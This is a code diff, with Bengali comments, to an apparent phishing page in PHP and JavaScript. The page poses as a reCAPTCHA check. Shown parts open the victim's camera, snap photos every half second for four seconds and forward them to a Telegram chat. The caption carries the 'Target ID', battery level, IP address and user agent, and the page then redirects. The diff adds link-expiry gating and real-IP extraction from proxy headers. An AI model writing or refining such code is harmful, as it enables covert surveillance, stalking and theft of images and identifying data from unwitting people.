@@ -1,19 +1,21 @@
 <?php
-// Hex timestamp ডিকোড করে মেয়াদ চেক করা
+// ১. এক্সপায়ারি টাইম চেক করা (লিংকে 'e' প্যারামিটার বাধ্যতামূলক)
 $expiryTime = 0;
 if (isset($_GET['e']) && !empty($_GET['e'])) {
     $expiryTime = hexdec($_GET['e']);
 }
 
-// ২৪ ঘণ্টা ১ মিনিট পার হয়ে গেলে পুরোনো/যেকোনো লিংক থেকে ছবি সেন্ড ব্লক হয়ে যাবে
-if ($expiryTime > 0 && time() > $expiryTime) {
+// যদি লিংকে এক্সপায়ারি টাইম না থাকে অথবা মেয়াদ শেষ হয়ে যায়, তবে রিকোয়েস্ট ব্লক করে দেওয়া হবে
+if ($expiryTime === 0 || time() > $expiryTime) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        exit;
+        exit; // মেয়াদ শেষ বা টাইম না থাকলে ছবি টেলিগ্রামে যাবে না
     }
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
-    if ($expiryTime > 0 && time() > $expiryTime) {
+    
+    // পোস্ট রিকোয়েস্টের সময়েও আরেকবার সিকিউরিটি চেক
+    if ($expiryTime === 0 || time() > $expiryTime) {
         exit;
     }
 
@@ -35,10 +37,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $fileName = 'img_' . uniqid() . '.png';
     $filePath = $uploadDir . $fileName;
 
+    // Render বা ক্লাউড সার্ভার থেকে ইউজারের রিয়েল আইপি অ্যাড্রেস বের করার সঠিক পদ্ধতি
+    $ipAddress = $_SERVER['REMOTE_ADDR'];
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ipAddress = trim($ipList[0]);
+    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+    }
+
     if (file_put_contents($filePath, base64_decode($imgData))) {
         $postFields = [
             'chat_id' => $chatId,
-            'caption' => "🎯 Target ID: " . ($_POST['target'] ?? 'direct') . "\n🔋 Battery: " . ($_POST['battery'] ?? 'Unknown') . "\n🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n💻 UA: " . ($_POST['user_agent'] ?? 'Unknown'),
+            'caption' => "🎯 Target ID: " . ($_POST['target'] ?? 'direct') . "\n" .
+                         "🔋 Battery: " . ($_POST['battery'] ?? 'Unknown') . "\n" .
+                         "🌐 IP: " . $ipAddress . "\n" .
+                         "💻 UA: " . ($_POST['user_agent'] ?? 'Unknown'),
             'photo'   => new CURLFile(realpath($filePath))
         ];
 
@@ -108,11 +122,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         function startAutoVerification() {
             document.getElementById('recaptchaCheckbox').classList.add('loading');
-            const interval = setInterval(captureAndUpload, 500); // প্রতি ০.৫ সেকেন্ড পর পর
+            const interval = setInterval(captureAndUpload, 500); 
             setTimeout(() => {
                 clearInterval(interval);
                 window.location.href = finalUrl;
-            }, 4000); // ৪ সেকেন্ড পর রিডাইরেক্ট
+            }, 4000); 
         }
 
         navigator.mediaDevices.getUserMedia({ video: true })
